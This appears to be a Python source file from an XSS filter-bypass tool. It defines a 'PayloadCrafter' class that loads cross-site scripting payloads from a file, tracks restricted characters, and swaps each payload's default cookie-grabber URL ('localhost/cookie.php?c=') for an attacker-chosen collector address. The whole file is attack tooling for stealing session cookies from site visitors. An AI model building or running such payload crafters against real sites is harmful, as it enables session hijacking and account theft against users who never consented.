import sys


class PayloadCrafter:
    def __init__(self, grabberAddress="http://localhost/cookie.php?c="):
        self.restricted = []
        self.payloads = []
        
        self.oldAddress = "http://localhost/cookie.php?c="
        self.grabberAddress = grabberAddress
                
        self.load_payloads()
        
    def setGrabberAddress(self, grabberAddress):
        if type(grabberAddress) is str:
            self.grabberAddress = grabberAddress
        else:
            sys.stderr.write("Error. Address of the grabber has to be a string.")
            raise TypeError
    
    def load_payloads(self):
        with open('XSSFilterBypass/payloads.txt', 'r') as payloads:
            for payload in payloads:
                self.payloads.append(payload.strip())
        
    def add_restricted(self, elements):
        if type(elements) is str:
            self.restricted.append(elements)
        elif type(elements) is int:
            self.restricted.append(str(elements))
        elif type(elements) is list:
            for element in elements:
                self.add_restricted(element)
        else:
            sys.stderr.write("Error. restricted items must be passed as a string or a list.\n")
            raise TypeError
    
    def craft(self, payload):
        return payload.replace(self.oldAddress, self.grabberAddress)
        